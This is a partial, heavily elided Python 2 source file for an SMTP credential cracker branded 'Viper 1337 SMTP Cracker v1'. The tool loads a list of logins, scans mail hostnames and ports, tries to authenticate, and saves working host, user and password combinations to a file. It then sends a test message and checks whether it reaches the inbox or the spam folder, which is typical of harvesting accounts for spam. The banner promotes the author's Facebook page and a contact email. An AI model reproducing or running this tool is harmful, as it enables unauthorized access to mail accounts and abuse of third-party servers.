	...
	def find(self):
			...
			if self.spam=='':
				for f in folders:
					...
					if self.spam=="":
						...
						break
		print '\033[91m [+] Scanning For Email\033[91m\n'
		...
		for k,t in enumerate(to_check):
			...
			if times-2>self.timeout:
				...
				open('result.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
				found.append(k)
				
			if len(rez)>0:
				open('result.txt','a').write(t[0]+"| INBOX | %.2f sec\n"%times)
				found.append(k)
		...
		for k,t in enumerate(to_check):
			...
			if times-2>self.timeout:
				...
				found.append(k)
			if len(rez)>0:
				open('result.txt','a').write(t[0]+"| SPAM | %.2f sec\n"%times)
				found.append(k)
		new=[]
...
class consumer(threading.Thread):
	def __init__(self,qu):
		...
		self.q=qu
		self.hosts=["","smtp.","mail.","webmail.","pop3."]
		self.ports=[587,465,25,110,143,993,995,26]
	...
	def findHost(self,host):
		...
		try:
			...
			try:
				...
				if rbads:
					bads.append(host)
					open('badlogin.txt','a').write(host+'\n')
				return None
		except KeyError:
			pass
		print '\033[91m [*] Scanning: \033[91m'+host+"\n"
		cache[host]=[-1,-1]
		for i,p in enumerate(self.ports):
			for j,h in enumerate(self.hosts):
				
				try:
					print '\033[91m [*] Scanning: \033[91m'+h+host+':'+str(p)+"\n"
	...
	def connect(self,tupple,ssl=False):
		...
		print '\033[91m[+] Connect.. \033[91m'+host+":"+port+" "+user+" "+passw+"\n"
		try:
			...
			if rez[0:3]!="235" or 'fail' in rez:
				...
				s.close()
				return 0
			print '\033[92m[>] WOW NEW SMTP >> '+host+':'+port+' '+user+' '+passw
			open('result.txt','a').write(host+":"+port+","+user+","+passw+"\n")
			...
			headers+='Subject: Dr HeX SMTP From %s:%s'%(host,port)+'\r\n'
			...
			open('timeout.txt','a').write(host+":"+port+":"+str(e)+"\n")
			s.close()
			return self.addBad(host1)
	def run(self):
		while True:
...
try:
 ...
 __      ___                   __ ____ ____ ______    _____ __  __ _______ _____     _____                _                    __ 
 \ \    / (_)                 /_ |___ \___ \____  |  / ____|  \/  |__   __|  __ \   / ____|              | |                  /_ |
  \ \  / / _ _ __   ___ _ __   | | __) |__) |  / /  | (___ | \  / |  | |  | |__) | | |     _ __ __ _  ___| | _____ _ __  __   _| |
   \ \/ / | | '_ \ / _ \ '__|  | ||__ <|__ <  / /    \___ \| |\/| |  | |  |  ___/  | |    | '__/ _` |/ __| |/ / _ \ '__| \ \ / / |
    \  /  | | |_) |  __/ |     | |___) |__) |/ /     ____) | |  | |  | |  | |      | |____| | | (_| | (__|   <  __/ |     \ V /| |
     \/   |_| .__/ \___|_|     |_|____/____//_/     |_____/|_|  |_|  |_|  |_|       \_____|_|  \__,_|\___|_|\_\___|_|      \_/ |_|
            | |                                                                                                                   
            |_|                                                                                                                   

 \n
    \033[91mViper 1337 SMTP Cracker v1

     Fb Page:https://www.facebook.com/viper1337official
 ...
 ''')
 inputs=open(raw_input('\033[91m[\033[92m+\033[91m]\033[92mSMTP List : \033[93m '),'r').read().splitlines()
 email=raw_input("\033[91m[\033[92m+\033[91m]\033[92mYour Email : \033[93m ")#dont change this
 thret= 20 #raw_input("\033[91m[\033[92m+\033[91m]\033[92mThreads(Max:200) : \033[93m ")#dont change this
 if int(thret)>200:
	thret=200
 print """ \033[93m[\033[91m!\033[93m] Viper 1337 SMTP Cracker\n 
 Recoder Mail : %s
 \033[94m[\033[92m/\033[94m] \033[93mEmail: > contactupdaterscenter@gmail.com"""%(email)
